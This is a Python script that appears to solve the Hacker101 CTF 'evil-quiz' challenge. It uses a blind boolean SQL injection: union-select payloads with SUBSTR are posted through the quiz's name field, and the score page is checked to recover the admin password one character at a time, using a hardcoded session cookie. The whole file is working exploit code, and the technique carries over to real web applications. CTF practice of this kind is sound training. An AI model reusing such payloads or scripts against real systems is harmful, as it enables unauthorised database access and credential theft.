#!/usr/bin/python3

import string

from requests import get, post

letters = string.printable
cookies = {"quizsession": "a3e4c87da67d163ef3b35e01898f7c78"}

url = "https://eda5bd29aab8ed3644f59fb36e46658b.ctf.hacker101.com/evil-quiz/"

payload = "' union select 1,2,3,4 from admin where username ='admin' and SUBSTR(password,1,1) = 'S' -- -"
password = ""


def attack(passwd) -> str:
	index = len(passwd) + 1

	for letter in letters:
		data = {"name": f"' union select 1,2,3,4 from admin where username ='admin' and SUBSTR(password, {index},1) = '{letter}' -- -"}
		#print(letter)
		post(url, cookies=cookies, data=data)
		r = get(url + "score", cookies=cookies)
		#print(r.text)
		
		if "There is 1 other" in r.text:
			return passwd + letter
	return passwd


while True:
	new_password = attack(password)
	
	if new_password == password:
		print(f"[*]Password is: {password}")

	password = new_password